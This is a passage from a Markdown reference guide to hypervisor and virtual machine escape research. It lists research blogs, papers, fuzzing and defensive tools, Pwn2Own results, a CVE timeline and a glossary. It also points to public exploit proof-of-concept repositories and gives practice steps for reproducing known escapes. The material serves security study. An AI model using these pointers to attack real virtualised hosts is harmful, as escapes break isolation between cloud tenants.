| Google Project Zero | projectzero.google | An EPYC Escape, KVM research |
| Google Bug Hunters | bughunters.google.com/blog | Hypervisor fuzzing tales |
| Exodus Intelligence | blog.exodusintel.com | VM escape exploits, 0-days |
| ZDI (Zero Day Initiative) | zerodayinitiative.com/blog | Pwn2Own, VMware RPCI |
| Phrack Magazine | phrack.org/issues/70/5 | QEMU VM escape case study |
| Synacktiv | synacktiv.com/en/publications | Pwn2Own 2025 VMware escape |
| Keen Lab (Tencent) | keenlab.tencent.com | "A bunch of Red Pills" VMware |
| Quarkslab | blog.quarkslab.com | Xen XSA-148, XSA-182 exploitation |
| OtterSec / osec.io | osec.io/blog | virtio-snd 0-day → QEMU escape |
| NCC Group | nccgroup.com/research | VMware guest-to-host exploit dev |
| Huntress | huntress.com/blog | ESXi exploitation in the wild |
| MSRC Blog | microsoft.com/msrc/blog | Hyper-V VM worker process |
| SafeBreach Labs | safebreach.com/blog | hAFL2, Hyper-V fuzzing |
| Qihoo 360 | blogs.360.cn | VMware escape research |
| Positive Technologies | ptsecurity.com | ESXi/vCenter research |
| Sina Karvandi | rayanfam.com | Hypervisor from scratch |
| Brandon Falk | gamozolabs.github.io | Hypervisor fuzzing |
| j00ru (Mateusz Jurczyk) | j00ru.vexillium.org | Kernel/HV research |
| xchglabs | xchglabs.com/blog | Escaping QEMU walkthrough |
| j0nathanj | j0nathanj.github.io | VBox VM escape story |

### Academic Papers & Conference Talks

```
Must-read papers:

1. "Subvirt: Implementing malware with virtual machines"
   King & Chen, 2006. IEEE S&P.
   → Hypervisor rootkit concept

2. "Bluepill: Subverting Vista Kernel for Fun and Profit"  
   Joanna Rutkowska, Black Hat 2006
   → Runtime hypervisor injection

3. "Cloudburst: Hacking 3D and Breaking Out of VMware"
   Kostya Kortchinsky, Black Hat 2009
   → First practical VM escape demo

4. "VENOM: Virtualized Environment Neglected Operations Manipulation"
   Jason Geffner, CrowdStrike 2015
   → QEMU FDC overflow affecting millions

5. "A Study of the Feasibility of Co-Resident VM Side-Channel Attacks"
   Ristenpart et al., CCS 2009
   → Cross-VM side channels

6. "kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels"
   Schumilo et al., USENIX Security 2017
   → Kernel/hypervisor fuzzing

7. "Nyx: Greybox Hypervisor Fuzzing using Fast Snapshots"
   Schumilo et al., USENIX Security 2021
   → State-of-art hypervisor fuzzing

8. "hAFL2: A Hypervisor Fuzzer"
   SafeBreach Labs, 2021
   → Hyper-V fuzzing framework

9. "VIRTIO: An I/O virtualization framework for Linux"
   Rusty Russell, 2008
   → Understanding virtio attack surface

10. "Breaking Out of VirtualBox through 3D Acceleration"
    Niklas Baumstark, Imre Rad, DEF CON 2018
    → VirtualBox Chromium escape

11. "An EPYC Escape: Case-study of a KVM breakout"
    Felix Wilhelm, Google Project Zero, 2021
    → First public KVM-only guest-to-host escape (no QEMU bugs)

12. "An Exploitation Chain to Break out of VMware ESXi"
    Zhao et al., WOOT 2019
    → Full ESXi escape methodology

13. "A Dive in to Hyper-V Architecture and Vulnerabilities"
    Joe Bialek & Nicolas Joly, Black Hat USA 2018
    → Deep Hyper-V internals + vuln analysis

14. "Exploiting the Hyper-V IDE Emulator to Escape the Virtual Machine"
    Joe Bialek, Black Hat USA 2019
    → Hyper-V VM escape demonstration

15. "Hyntrospect: A Fuzzer for Hyper-V Devices"
    Diane Dubois (Google), SSTIC 2021
    → Structured Hyper-V device fuzzing

16. "HYPERPILL: Fuzzing for hypervisor-bugs by leveraging 
     the hardware virtualization interface"
    USENIX Security 2024
    → Novel hypervisor fuzzing approach

17. "3D Red Pill: A Guest-to-Host Escape on QEMU/KVM Virtio Devices"
    Black Hat Asia 2020
    → Virtio-specific escape techniques

18. "Breaking Isolation: A New Perspective on Hypervisor 
     Exploitation via Cross-Domain Attacks"
    arXiv 2512.04260
    → Cross-domain attack taxonomy

19. "Ouroboros: Tearing Xen Hypervisor With The Snake"
    Black Hat USA 2016
    → Xen exploitation methodology

20. "On the clock: Escaping VMware Workstation at Pwn2Own Berlin 2025"
    Synacktiv, 2025
    → PVSCSI heap overflow + LFH bypass
```

### Tools

```
Offensive / Research:
├── QEMU source code — gitlab.com/qemu-project/qemu
├── VirtualBox source code — virtualbox.org/wiki/Downloads (OSE)
├── Xen source code — xenproject.org
├── SimpleVisor — github.com/ionescu007/SimpleVisor (mini hypervisor)
├── hvpp — github.com/wbenny/hvpp (educational hypervisor)
├── Bareflank — github.com/Bareflank/hypervisor
├── HyperPlatform — github.com/tandasat/HyperPlatform
├── open-vm-tools — github.com/vmware/open-vm-tools

Exploit PoCs & Writeups:
├── mtalbi/vm_escape — github.com/mtalbi/vm_escape (Phrack CVE-2015-5165+7504)
├── 0xKira/qemu-vm-escape — github.com/0xKira/qemu-vm-escape (CVE-2019-6778)
├── rip1s/vmware_escape — github.com/rip1s/vmware_escape (CVE-2017-4901)
├── vincentbernat/cve-2015-3456 — VENOM experiments
└── Exploit-DB 43878 — VirtualBox CVE-2018-2698 escape

Curated Collections (QUAN TRỌNG):
├── xairy/vmware-exploitation — VMware escape papers, slides, videos
├── WinMin/awesome-vm-exploit — Cross-platform VM escape resources
├── shogunlab/awesome-hyper-v-exploitation — Hyper-V research
├── gerhart01/Hyper-V-Internals — Tooling, hypercall extraction, PoCs
└── Escapingbug — VM escape writeups collection

Fuzzing:
├── AFL++ — github.com/AFLplusplus/AFLplusplus
├── LibFuzzer — part of LLVM
├── Nyx — github.com/nyx-fuzz (hypervisor fuzzing)
├── hAFL2 — github.com/SB-GC-Labs/hAFL2 (Hyper-V)
├── kAFL — github.com/IntelLabs/kafl.fuzzer (Intel PT)
├── QEMU fuzz targets — qemu/tests/qtest/fuzz/
└── Hyntrospect — Hyper-V device fuzzer (SSTIC 2021)

Defensive:
├── Falco — runtime security monitoring
├── YARA — malware detection rules
├── Volatility — memory forensics
├── CHIPSEC — firmware/hardware security
└── Lynis — security auditing
```

### Pwn2Own VM Escape History

```
┌──────┬─────────────────────────┬───────────────────────┬───────────────┬──────────┐
│ Year │ Team                    │ Target                │ Method        │ Prize    │
├──────┼─────────────────────────┼───────────────────────┼───────────────┼──────────┤
│ 2017 │ Qihoo 360 Security      │ Edge→Win→VMware WS    │ DnD overflow  │ $105,000 │
│ 2017 │ Team Sniper (Keen Lab)  │ VMware Workstation    │ 3-bug chain   │ $100,000 │
│ 2018 │ fluorescence            │ VirtualBox            │ 3D accel      │ $35,000  │
│ 2019 │ fluorescence + amat     │ VMware Workstation    │ Multiple      │ $70,000  │
│ 2020 │ Amat Cama               │ VirtualBox            │ OOB R/W       │ $40,000  │
│ 2023 │ STAR Labs               │ VMware Workstation    │ UAF chain     │ $80,000  │
│ 2024 │ Multiple                │ VMware/VirtualBox     │ Multiple      │ Various  │
│ 2025 │ Synacktiv               │ VMware WS (PVSCSI)    │ Heap overflow │ $80,000  │
│ 2025 │ Multiple                │ VMware ESXi           │ First ESXi!   │ Various  │
└──────┴─────────────────────────┴───────────────────────┴───────────────┴──────────┘
```

### CTF & Practice

```
VM Escape CTF Challenges:
1. Real World CTF — often has VM escape challenges
2. GeekPwn — VMware/QEMU escape contests
3. Pwn2Own — annual VM escape category
4. HITB CTF — occasional hypervisor challenges

Practice:
1. Build QEMU from old version, reproduce VENOM
2. Build VirtualBox, reproduce Chromium 3D bugs
3. Write mini hypervisor (SimpleVisor/hvpp), add features
4. Fuzz QEMU devices with built-in fuzz targets
5. Set up Nyx/hAFL2, fuzz hypervisor interfaces
6. Analyze VMware patches (diff between versions)
7. Read XSA advisories, reproduce in Xen lab

Online Resources:
- phrack.org — classic exploit research
- exploit-db.com — CVE exploits
- github.com/Escapingbug — VM escape writeups
- youtube: Black Hat / DEF CON talks on VM escape
```

---

## Appendix A: Quick Reference — VM Escape CVE Timeline

```
2009  CVE-2009-1244    Cloudburst           VMware Workstation     Display func
2012  CVE-2012-0217    Xen PV               Xen                    SYSRET 
2014  CVE-2014-0983    VirtualBox 3D         VirtualBox             Chromium
2015  CVE-2015-3456    VENOM                 QEMU/KVM/Xen/VBox     FDC overflow
2015  CVE-2015-5165    RTL8139 leak          QEMU                   Info leak
2015  CVE-2015-7504    pcnet overflow        QEMU                   Heap overflow
2016  CVE-2016-1568    e1000 UAF             QEMU                   Use-after-free
2016  CVE-2016-3710    VGA OOB               QEMU                   VBE OOB
2016  CVE-2016-7161    xlnx overflow         QEMU                   CVSS 10.0 heap overflow
2017  CVE-2017-4901    DnD overflow          VMware Workstation     Heap overflow
2017  CVE-2017-4902-05 Pwn2Own chain         VMware Workstation     Multiple
2017  CVE-2017-15592   Shadow paging         Xen                    Page table
2018  CVE-2018-2698    VBVA escape           VirtualBox             OOB R/W via HGSMI
2018  CVE-2018-3005    3D Accel              VirtualBox             OOB
2019  CVE-2019-5736    runc overwrite        Docker/containers      Race condition
2019  CVE-2019-6778    SLiRP heap            QEMU                   Heap overflow
2019  CVE-2019-14378   SLiRP reassembly      QEMU                   Ptr miscalculation
2019  CVE-2019-2525    Chromium leak         VirtualBox             Info leak
2020  CVE-2020-14364   USB EHCI              QEMU                   OOB R/W
2020  CVE-2020-3962    SVGA UAF              VMware ESXi/WS         Use-after-free
2021  CVE-2021-28476   vmswitch              Hyper-V                Ptr deref (CVSS 9.9)
2021  CVE-2021-21974   OpenSLP               VMware ESXi            Heap overflow
2021  CVE-2021-29657   EPYC Escape           KVM (AMD nested)       First KVM-only escape
2022  CVE-2022-30163   Race condition        Hyper-V                Timed hypercalls
2022  CVE-2022-31705   USB XHCI              VMware ESXi            OOB R/W
2023  CVE-2023-20869   Bluetooth             VMware Workstation     Stack overflow
2023  CVE-2023-34048   vCenter               VMware vCenter         OOB write (UNC3886)
2023  CVE-2023-3180    virtio-crypto         QEMU                   Heap overflow
2025  CVE-2025-22224   VMCI TOCTOU           VMware ESXi            OOB write (CVSS 9.3)
2025  CVE-2025-22225   VMX sandbox escape    VMware ESXi            Arb write
2025  CVE-2025-22226   HGFS info leak        VMware ESXi            OOB read
2025  CVE-2025-41238   PVSCSI heap overflow  VMware ESXi            Pwn2Own Berlin (CVSS 9.3)
2026  CVE-2026-53359   Januscape             KVM (shadow MMU)       UAF, 16-year-old bug
2026  CVE-2026-64561   Zapscape              KVM (shadow MMU)       Expired ptr deref
2026  CVE-2026-46316   ITScape               KVM/arm64              First arm64 KVM escape
2026  CVE-2026-47652   Hypercall overflow    Hyper-V                Heap overflow (CVSS 8.2)
2026  CVE-2026-62428   Grant-copy confusion  Xen                    Type confusion
```

## Appendix B: Glossary

```
ASLR     — Address Space Layout Randomization
BPF/eBPF — Berkeley Packet Filter / extended BPF  
DMA      — Direct Memory Access
EPT      — Extended Page Tables (Intel)
GPA      — Guest Physical Address
GVA      — Guest Virtual Address
HGCM     — Host-Guest Communication Manager (VirtualBox)
HPA      — Host Physical Address
HV       — Hypervisor
IOMMU    — I/O Memory Management Unit
KVM      — Kernel-based Virtual Machine
MMIO     — Memory-Mapped I/O
NPT      — Nested Page Tables (AMD)
OOB      — Out-of-Bounds (read/write)
PIO      — Port I/O (IN/OUT instructions)
ROP      — Return-Oriented Programming
RPCI     — Remote Procedure Call Interface (VMware)
SLAT     — Second Level Address Translation
SVM      — Secure Virtual Machine (AMD-V)
SVGA     — Super Video Graphics Array
UAF      — Use-After-Free
VIB      — vSphere Installation Bundle
VMCB     — Virtual Machine Control Block (AMD)
VMCS     — Virtual Machine Control Structure (Intel)
VMM      — Virtual Machine Monitor
VMX      — Virtual Machine Extensions (Intel)
VPID     — Virtual Processor Identifier
VSC      — Virtual Service Consumer (Hyper-V guest side)
VSP      — Virtual Service Provider (Hyper-V host side)
VT-d     — Virtualization Technology for Directed I/O
VT-x     — Virtualization Technology Extensions
XSA      — Xen Security Advisory
```

---

> **Disclaimer**: Tài liệu này chỉ phục vụ mục đích nghiên cứu bảo mật, học thuật, CTF, và authorized penetration testing. Sử dụng các kỹ thuật này trên hệ thống không được phép là vi phạm pháp luật.

> **Last updated**: 2026-08-30  
> **Author**: Security Research Notes
